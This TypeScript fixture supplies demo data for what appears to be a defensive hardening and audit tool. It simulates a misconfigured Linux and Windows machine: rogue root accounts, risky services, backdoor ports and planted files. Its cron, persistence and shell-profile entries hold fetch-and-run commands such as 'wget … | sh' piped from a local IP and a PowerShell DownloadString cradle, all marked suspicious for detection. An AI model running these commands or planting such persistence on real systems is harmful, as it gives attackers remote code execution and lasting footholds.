import type { FileRecord, PortRecord, ServiceRecord, UserRecord } from "../types.js";

/** Frozen clock so demo output is deterministic on macOS and CI. */
export const DEMO_NOW = "2026-09-18T18:00:00.000Z";

function linuxUser(partial: Omit<UserRecord, "passwordHidden" | "platform">): UserRecord {
  return { passwordHidden: true, platform: "linux", enabled: partial.locked ? false : true, ...partial };
}

function winUser(partial: Omit<UserRecord, "passwordHidden" | "platform">): UserRecord {
  return { passwordHidden: true, platform: "windows", ...partial };
}

export const demoUsers: UserRecord[] = [
  linuxUser({
    name: "root",
    uid: 0,
    gid: 0,
    home: "/root",
    shell: "/bin/bash",
    groups: ["root"],
    lastLogin: "2026-09-18T12:00:00.000Z",
    createdAt: "2024-01-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "alice",
    uid: 1000,
    gid: 1000,
    home: "/home/alice",
    shell: "/bin/bash",
    groups: ["alice", "sudo", "adm"],
    lastLogin: "2026-09-18T16:40:00.000Z",
    createdAt: "2025-08-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "bob",
    uid: 1001,
    gid: 1001,
    home: "/home/bob",
    shell: "/bin/bash",
    groups: ["bob"],
    lastLogin: "2026-09-17T09:00:00.000Z",
    createdAt: "2025-08-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
    passwordNeverExpires: true,
  }),
  linuxUser({
    name: "coach",
    uid: 1002,
    gid: 1002,
    home: "/home/coach",
    shell: "/bin/bash",
    groups: ["coach"],
    lastLogin: "2026-09-10T11:00:00.000Z",
    createdAt: "2025-08-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "www-data",
    uid: 33,
    gid: 33,
    home: "/var/www",
    shell: "/usr/sbin/nologin",
    groups: ["www-data"],
    lastLogin: null,
    createdAt: "2024-01-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: false,
  }),
  linuxUser({
    name: "sshd",
    uid: 110,
    gid: 65534,
    home: "/run/sshd",
    shell: "/usr/sbin/nologin",
    groups: ["sshd"],
    lastLogin: null,
    createdAt: "2024-01-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: false,
  }),
  linuxUser({
    name: "daemon",
    uid: 1,
    gid: 1,
    home: "/usr/sbin",
    shell: "/usr/sbin/nologin",
    groups: ["daemon"],
    lastLogin: null,
    createdAt: "2024-01-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: false,
  }),
  linuxUser({
    name: "hacker123",
    uid: 1010,
    gid: 1010,
    home: "/home/hacker123",
    shell: "/bin/bash",
    groups: ["hacker123"],
    lastLogin: "2026-09-18T01:00:00.000Z",
    createdAt: "2026-09-12T04:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "toor",
    uid: 0,
    gid: 0,
    home: "/tmp/toor",
    shell: "/bin/bash",
    groups: ["root"],
    lastLogin: "2026-09-18T03:12:00.000Z",
    createdAt: "2026-09-16T22:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "games",
    uid: 5,
    gid: 60,
    home: "/usr/games",
    shell: "/bin/bash",
    groups: ["games"],
    lastLogin: null,
    createdAt: "2024-01-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: true,
    passwordSet: false,
    passwordNeverExpires: true,
  }),
  linuxUser({
    name: "nologin_admin",
    uid: 1005,
    gid: 1005,
    home: "/home/nologin_admin",
    shell: "/bin/bash",
    groups: ["nologin_admin", "sudo"],
    lastLogin: null,
    createdAt: "2026-09-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "zygote",
    uid: 666,
    gid: 666,
    home: "/var/tmp/zygote",
    shell: "/usr/bin/python3",
    groups: ["zygote", "docker"],
    lastLogin: "2026-09-17T23:00:00.000Z",
    createdAt: "2026-09-17T18:30:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "flag",
    uid: 1337,
    gid: 1337,
    home: "/home/flag",
    shell: "/bin/bash",
    groups: ["flag"],
    lastLogin: null,
    createdAt: "2026-09-18T08:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: true,
  }),
  linuxUser({
    name: "sync",
    uid: 4,
    gid: 65534,
    home: "/bin",
    shell: "/bin/sync",
    groups: ["sync"],
    lastLogin: null,
    createdAt: "2024-01-01T00:00:00.000Z",
    locked: false,
    passwordEmpty: false,
    passwordSet: false,
  }),
  winUser({
    name: "Administrator",
    uid: 500,
    sid: "S-1-5-21-1000-1000-1000-500",
    home: "C:\\Users\\Administrator",
    groups: ["Administrators"],
    lastLogin: "2026-09-18T10:00:00.000Z",
    createdAt: "2025-01-01T00:00:00.000Z",
    locked: false,
    enabled: true,
    passwordEmpty: false,
    passwordSet: true,
  }),
  winUser({
    name: "Guest",
    uid: 501,
    sid: "S-1-5-21-1000-1000-1000-501",
    home: "C:\\Users\\Guest",
    groups: ["Guests"],
    lastLogin: null,
    createdAt: "2025-01-01T00:00:00.000Z",
    locked: false,
    enabled: true,
    passwordEmpty: true,
    passwordSet: false,
    passwordNeverExpires: true,
  }),
  winUser({
    name: "alice",
    uid: 1001,
    sid: "S-1-5-21-1000-1000-1000-1001",
    home: "C:\\Users\\alice",
    groups: ["Users", "Administrators"],
    lastLogin: "2026-09-18T15:00:00.000Z",
    createdAt: "2025-08-01T00:00:00.000Z",
    locked: false,
    enabled: true,
    passwordEmpty: false,
    passwordSet: true,
  }),
];

export const demoGroups = [
  { name: "sudo", members: ["alice", "nologin_admin"], privileged: true },
  { name: "root", members: ["root", "toor"], privileged: true },
  { name: "docker", members: ["zygote"], privileged: true },
  { name: "Administrators", members: ["Administrator", "alice"], privileged: true },
  { name: "Guests", members: ["Guest"], privileged: false },
  { name: "users", members: ["alice", "bob", "coach"], privileged: false },
];

export const demoServices: ServiceRecord[] = [
  { name: "sshd", state: "running", enabled: true, required: true, risky: false, description: "OpenSSH server", platform: "linux" },
  { name: "apache2", state: "running", enabled: true, required: true, risky: false, description: "Apache HTTP", platform: "linux" },
  { name: "telnet", state: "running", enabled: true, required: false, risky: true, description: "Telnet server", platform: "linux" },
  { name: "vsftpd", state: "running", enabled: true, required: false, risky: true, description: "FTP server (anonymous)", platform: "linux" },
  { name: "cups", state: "running", enabled: true, required: false, risky: true, description: "Printing", platform: "linux" },
  { name: "avahi-daemon", state: "running", enabled: true, required: false, risky: true, description: "mDNS", platform: "linux" },
  { name: "smbd", state: "running", enabled: true, required: false, risky: true, description: "Samba SMB", platform: "linux" },
  { name: "nmbd", state: "running", enabled: true, required: false, risky: true, description: "Samba NetBIOS", platform: "linux" },
  { name: "mysql", state: "stopped", enabled: false, required: false, risky: false, description: "MySQL", platform: "linux" },
  { name: "rpcbind", state: "running", enabled: true, required: false, risky: true, description: "RPC portmapper", platform: "linux" },
  { name: "bluetooth", state: "stopped", enabled: true, required: false, risky: true, description: "Bluetooth", platform: "linux" },
  { name: "cron", state: "running", enabled: true, required: true, risky: false, description: "Cron", platform: "linux" },
  { name: "TermService", state: "running", enabled: true, required: false, risky: true, description: "Remote Desktop", platform: "windows" },
  { name: "TlntSvr", state: "running", enabled: true, required: false, risky: true, description: "Telnet", platform: "windows" },
  { name: "RemoteRegistry", state: "running", enabled: true, required: false, risky: true, description: "Remote Registry", platform: "windows" },
  { name: "WinDefend", state: "stopped", enabled: false, required: true, risky: false, description: "Microsoft Defender", platform: "windows" },
  { name: "mpssvc", state: "stopped", enabled: false, required: true, risky: false, description: "Windows Defender Firewall", platform: "windows" },
];

export const demoPorts: PortRecord[] = [
  { protocol: "tcp", port: 22, address: "0.0.0.0", process: "sshd", pid: 1024, required: true, suspicious: false },
  { protocol: "tcp", port: 80, address: "0.0.0.0", process: "apache2", pid: 1100, required: true, suspicious: false },
  { protocol: "tcp", port: 23, address: "0.0.0.0", process: "telnetd", pid: 2048, required: false, suspicious: true, reason: "Telnet in the clear" },
  { protocol: "tcp", port: 21, address: "0.0.0.0", process: "vsftpd", pid: 2050, required: false, suspicious: true, reason: "FTP" },
  { protocol: "tcp", port: 445, address: "0.0.0.0", process: "smbd", pid: 2060, required: false, suspicious: true, reason: "SMB exposed" },
  { protocol: "tcp", port: 139, address: "0.0.0.0", process: "smbd", pid: 2060, required: false, suspicious: true, reason: "NetBIOS" },
  { protocol: "tcp", port: 111, address: "0.0.0.0", process: "rpcbind", pid: 400, required: false, suspicious: true, reason: "rpcbind" },
  { protocol: "tcp", port: 3306, address: "127.0.0.1", process: "mysqld", pid: 0, required: false, suspicious: false, reason: "mysql stopped but historically bound localhost" },
  { protocol: "tcp", port: 31337, address: "0.0.0.0", process: "nc", pid: 9090, required: false, suspicious: true, reason: "elite backdoor port" },
  { protocol: "tcp", port: 4444, address: "0.0.0.0", process: "python3", pid: 9091, required: false, suspicious: true, reason: "common reverse-shell port" },
  { protocol: "tcp", port: 3389, address: "0.0.0.0", process: "TermService", pid: 888, required: false, suspicious: true, reason: "RDP" },
  { protocol: "udp", port: 137, address: "0.0.0.0", process: "nmbd", pid: 2061, required: false, suspicious: true, reason: "NetBIOS name" },
];

export const demoFiles: FileRecord[] = [
  { path: "/etc/shadow", kind: "file", mode: "0644", owner: "root", worldWritable: false, note: "world-readable shadow" },
  { path: "/etc/sudoers", kind: "file", mode: "0666", owner: "root", worldWritable: true, note: "world-writable sudoers" },
  { path: "/etc/sudoers.d/hack", kind: "file", mode: "0777", owner: "nologin_admin", worldWritable: true, note: "NOPASSWD plant" },
  { path: "/etc/cron.d/hack", kind: "file", mode: "0777", owner: "root", worldWritable: true, note: "world-writable cron" },
  { path: "/tmp/suid_bash", kind: "file", mode: "4755", owner: "root", suid: true, note: "SUID bash in /tmp" },
  { path: "/home/flag/.hidden_shell", kind: "file", mode: "0755", owner: "flag", suid: true, hidden: true, note: "hidden SUID shell" },
  { path: "/tmp/.kworker", kind: "file", mode: "0755", owner: "zygote", hidden: true, note: "hidden fake kernel worker" },
  { path: "/home/bob/secret.mp3", kind: "file", mode: "0644", owner: "bob", note: "prohibited media" },
  { path: "/home/alice/Movies/clip.mp4", kind: "file", mode: "0644", owner: "alice", note: "prohibited media" },
  { path: "/home/bob/public", kind: "directory", mode: "0777", owner: "bob", worldWritable: true, note: "world-writable home dir" },
  { path: "/usr/local/bin", kind: "directory", mode: "0777", owner: "root", worldWritable: true, note: "world-writable PATH dir" },
  { path: "/tmp/nc", kind: "file", mode: "0755", owner: "flag", note: "netcat binary in /tmp" },
  { path: "/usr/local/bin/ncat", kind: "file", mode: "0755", owner: "root", note: "ncat outside distro path" },
  { path: "/root/.ssh/authorized_keys", kind: "file", mode: "0644", owner: "root", note: "key comment hacker@evil" },
  { path: "/home/zygote", kind: "directory", mode: "0755", owner: "root", note: "home not owned by user" },
  { path: "C:\\Users\\Public\\song.wav", kind: "file", mode: "0644", owner: "Guest", note: "prohibited media" },
  { path: "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.update.exe", kind: "file", hidden: true, owner: "alice", note: "hidden startup payload" },
];

export const demoPackages = [
  { name: "openssh-server", version: "1:9.6p1-3", prohibited: false },
  { name: "apache2", version: "2.4.58-1", prohibited: false },
  { name: "nmap", version: "7.94", prohibited: true },
  { name: "hydra", version: "9.5", prohibited: true },
  { name: "john", version: "1.9.0", prohibited: true },
  { name: "netcat-traditional", version: "1.10-47", prohibited: true },
  { name: "ophcrack", version: "3.8.0", prohibited: true },
  { name: "telnetd", version: "0.17-42", prohibited: true },
  { name: "vsftpd", version: "3.0.5", prohibited: false },
  { name: "samba", version: "4.19.0", prohibited: false },
];

export const demoShares = [
  { name: "public", path: "/srv/public", guest: true, writable: true },
  { name: "homes", path: "/home", guest: false, writable: false },
  { name: "C$", path: "C:\\", guest: false, writable: true },
  { name: "IPC$", path: "", guest: true, writable: false },
];

export const demoPolicy = {
  PASS_MAX_DAYS: 99999,
  PASS_MIN_DAYS: 0,
  PASS_MIN_LEN: 8,
  PASS_WARN_AGE: 7,
  umask: "022",
  PermitRootLogin: "yes",
  PermitEmptyPasswords: "yes",
  X11Forwarding: "yes",
  PasswordAuthentication: "yes",
  Protocol: "2,1",
  EnableLUA: 0,
  firewallEnabled: false,
  ufwStatus: "inactive",
  ip_forward: 1,
  tcp_syncookies: 0,
  pendingSecurityUpdates: 12,
};

export const demoChecksums = {
  "/etc/ssh/sshd_config": "demo-sha256-sshd-aaaaaaaa",
  "/etc/sudoers": "demo-sha256-sudoers-bbbbbbbb",
  "/etc/hosts": "demo-sha256-hosts-cccccccc",
  "/etc/passwd": "demo-sha256-passwd-dddddddd",
};

export const demoHostsEntries = [
  { ip: "127.0.0.1", names: ["localhost"] },
  { ip: "127.0.1.1", names: ["cp-image"] },
  { ip: "127.0.0.1", names: ["windowsupdate.microsoft.com"] },
  { ip: "0.0.0.0", names: ["google.com"] },
];

export const demoCron = [
  { user: "root", schedule: "*/15 * * * *", command: "wget -qO- http://10.13.37.1/p.sh | sh", suspicious: true },
  { user: "root", schedule: "0 4 * * *", command: "/usr/bin/apt-get update", suspicious: false },
  { user: "zygote", schedule: "@reboot", command: "/tmp/.kworker", suspicious: true },
];

export const demoSysctl = {
  "net.ipv4.ip_forward": "1",
  "net.ipv4.tcp_syncookies": "0",
  "net.ipv4.conf.all.accept_redirects": "1",
  "net.ipv4.conf.all.rp_filter": "0",
  "kernel.randomize_va_space": "2",
  "kernel.dmesg_restrict": "0",
};

export const demoExpectedPorts = [
  { protocol: "tcp" as const, port: 22 },
  { protocol: "tcp" as const, port: 80 },
  { protocol: "tcp" as const, port: 443 },
];

export const demoShareAcls = [
  { name: "public", path: "/srv/public", principal: "Everyone", rights: "Full", guest: true, writable: true },
  { name: "C$", path: "C:\\", principal: "Everyone", rights: "Read", guest: false, writable: true },
  { name: "homes", path: "/home", principal: "alice", rights: "Read", guest: false, writable: false },
];

export const demoRemoteTools = [
  { name: "teamviewer", kind: "package", path: "/usr/bin/teamviewer" },
  { name: "anydesk", kind: "package", path: "/usr/bin/anydesk" },
  { name: "x11vnc", kind: "binary", path: "/usr/bin/x11vnc" },
];

export const demoBrowserExtensions = [
  { browser: "chrome", id: "abcdefghijklmnopqrstuvwxyzabcdef", profile: "/home/bob/.config/google-chrome/Default/Extensions" },
  { browser: "firefox", id: "hacker@evil", profile: "/home/flag/.mozilla/firefox/abcd.default/extensions" },
];

export const demoPersistence = [
  { source: "rc.local", payload: "/tmp/.kworker", suspicious: true },
  { source: "cron.d", payload: "wget -qO- http://10.13.37.1/p.sh | sh", suspicious: true },
  { source: "profile.d", payload: "/etc/profile.d/backdoor.sh", suspicious: true },
  { source: "HKCU\\Run", payload: "C:\\Users\\alice\\AppData\\Roaming\\update.exe", suspicious: true },
  { source: "systemd", payload: "sshd.service", suspicious: false },
];

export const demoPermDrift = [
  { path: "/etc/shadow", mode: "0644", expected: "0640", drift: true },
  { path: "/etc/gshadow", mode: "0644", expected: "0640", drift: true },
  { path: "/etc/sudoers", mode: "0666", expected: "0440", drift: true },
  { path: "/etc/ssh/ssh_host_rsa_key", mode: "0644", expected: "0600", drift: true },
  { path: "C:\\Windows\\System32\\config\\SAM", mode: "Everyone:(R)", expected: "SYSTEM/Administrators only", drift: true },
];

export const demoTmpDirs: FileRecord[] = [
  { path: "/tmp", kind: "directory", mode: "0777", owner: "root", worldWritable: true, note: "missing sticky bit" },
  { path: "/var/tmp", kind: "directory", mode: "1777", owner: "root", worldWritable: true, note: "sticky ok" },
  { path: "/dev/shm", kind: "directory", mode: "1777", owner: "root", worldWritable: true, note: "sticky ok" },
  { path: "/tmp/world", kind: "directory", mode: "0777", owner: "zygote", worldWritable: true, note: "world-writable temp dir, no sticky" },
];

export const demoFtpConfig = {
  anonymous_enable: "YES",
  write_enable: "YES",
  anon_upload_enable: "YES",
  chroot_local_user: "NO",
  ssl_enable: "NO",
  configPath: "/etc/vsftpd.conf",
};

export const demoWebChecklist = [
  { id: "indexes", title: "Directory listings disabled", status: "fail" as const, detail: "Options Indexes in 000-default.conf", relatedOpId: "audit-web-server" },
  { id: "servertokens", title: "ServerTokens Prod", status: "fail" as const, detail: "ServerTokens OS", relatedOpId: "audit-web-server" },
  { id: "signature", title: "ServerSignature Off", status: "fail" as const, detail: "ServerSignature On", relatedOpId: "audit-web-server" },
  { id: "autoindex", title: "nginx autoindex off", status: "fail" as const, detail: "autoindex on in default site", relatedOpId: "audit-web-server" },
  { id: "tls", title: "No SSLv3/TLSv1", status: "fail" as const, detail: "SSLProtocol includes TLSv1", relatedOpId: "audit-web-server" },
];

export const demoNameResolution = {
  llmnr: true,
  netbios: "enabled",
  wpadAutoDetect: true,
  winHttpAutoProxy: "running",
};

export const demoNullSession = {
  RestrictAnonymous: 0,
  RestrictAnonymousSAM: 0,
  EveryoneIncludesAnonymous: 1,
  RestrictNullSessAccess: 0,
  NullSessionPipes: ["browser", "samr"],
  NullSessionShares: ["C$"],
  note: "SAM contents not dumped; registry classification only.",
};

export const demoIdleLock = {
  TMOUT: null,
  IdleAction: "ignore",
  ScreenSaveActive: 0,
  ScreenSaverIsSecure: 0,
  ScreenSaveTimeOut: 9999,
};

export const demoSysprepFiles: FileRecord[] = [
  { path: "C:\\Windows\\Panther\\unattend.xml", kind: "file", note: "AutoLogon key present (value omitted)" },
  { path: "/root/unattend.xml", kind: "file", note: "Password key present (value omitted)" },
  { path: "C:\\Windows\\System32\\Sysprep\\unattend.xml", kind: "file", note: "sysprep leftover" },
];

export const demoSnmp = {
  service: "snmpd",
  state: "running",
  communities: ["public", "private"],
  rwcommunity: true,
  port: 161,
};

export const demoMac = {
  selinux: "Permissive",
  apparmor: "complain",
  profilesComplain: 3,
  profilesEnforce: 1,
};

export const demoBrowserBaseline = [
  { id: "safebrowsing", title: "Firefox safebrowsing", status: "fail" as const, detail: "browser.safebrowsing.malware.enabled = false" },
  { id: "ie-pw", title: "IE disable password saving", status: "fail" as const, detail: "DisablePasswordSaving=0" },
  { id: "smartscreen", title: "Edge SmartScreen", status: "fail" as const, detail: "SmartScreenEnabled=0" },
];

export const demoAutoUpdates = {
  unattendedUpgrades: false,
  periodicUnattended: "0",
  wuauserv: "disabled",
  AUOptions: 1,
};

export const demoGames = [
  { name: "aisleriot", version: "1:3.22", prohibited: true },
  { name: "gnome-mines", version: "1:40.1", prohibited: true },
  { name: "example-content", version: "51", prohibited: true },
  { name: "Microsoft.MicrosoftSolitaireCollection", version: "4.0", prohibited: true },
];

export const demoIis = {
  features: ["IIS-WebServer", "IIS-WebServerRole", "IIS-FTPServer", "IIS-ASPNET45"],
  anonymousAuthentication: true,
  directoryBrowse: true,
  samples: true,
};

export const demoReadmeHits = [
  { path: "/home/alice/Desktop/README.txt", keyword: "forensics", line: "Forensics question 1: which media files were planted?" },
  { path: "/home/alice/Desktop/README.txt", keyword: "unauthorized", line: "Unauthorized FTP should not be running." },
  { path: "C:\\Users\\alice\\Desktop\\README.txt", keyword: "prohibited", line: "Remove prohibited games and sample content." },
];

export const demoShellBackdoors: FileRecord[] = [
  { path: "/home/zygote/.bashrc", kind: "file", mode: "0644", owner: "zygote", note: "alias sudo='echo pwned'" },
  { path: "/etc/profile.d/backdoor.sh", kind: "file", mode: "0755", owner: "root", note: "wget -qO- http://10.13.37.1/p.sh | sh" },
  { path: "/root/.bashrc", kind: "file", mode: "0644", owner: "root", note: "unset HISTFILE" },
  { path: "C:\\Users\\alice\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1", kind: "file", note: "Invoke-Expression (New-Object Net.WebClient).DownloadString(...)" },
];

export const demoDisplayManager = {
  lightdmAllowGuest: true,
  lightdmAutologin: "zygote",
  gdmAutomaticLoginEnable: true,
  gdmAutomaticLogin: "zygote",
};

export const demoHostConf = {
  path: "/etc/host.conf",
  order: "bind,hosts",
  multi: "on",
  nospoof: "off",
};

export const demoFail2ban = {
  installed: false,
  active: false,
  packageAvailable: true,
};

export const demoMalwareTools = {
  clamav: false,
  chkrootkit: false,
  lastScan: null as string | null,
  hits: [] as string[],
};

export const demoSfc = {
  command: "sfc /verifyonly",
  violations: [
    { path: "C:\\Windows\\System32\\drivers\\etc\\hosts.dll", detail: "hash mismatch (plant)" },
    { path: "C:\\Windows\\System32\\notepad.exe", detail: "hash mismatch" },
  ],
};

export const demoAuditPolicy = {
  "Account Logon": "No Auditing",
  "Account Management": "Success",
  "Logon/Logoff": "No Auditing",
  "Policy Change": "No Auditing",
  "Privilege Use": "No Auditing",
  System: "No Auditing",
};

export const demoRemoteServices = {
  RemoteRegistry: { state: "running", startType: "Automatic" },
  RemoteAssistance: { fAllowToGetHelp: 1, fAllowFullControl: 1 },
};

export const demoOptionalFeatures = [
  { name: "TelnetClient", state: "Enabled" },
  { name: "TFTP", state: "Enabled" },
  { name: "SMB1Protocol", state: "Enabled" },
  { name: "SimpleTCP", state: "Enabled" },
];

export const demoSecurityTemplate = {
  path: "config/windows/cp-baseline.inf",
  MinimumPasswordLength: 14,
  PasswordComplexity: 1,
  LockoutBadCount: 5,
  EnableGuestAccount: 0,
  AuditLogonEvents: 3,
};

export const DEFAULT_DEMO_ADMINS = ["root", "alice", "Administrator"] as const;
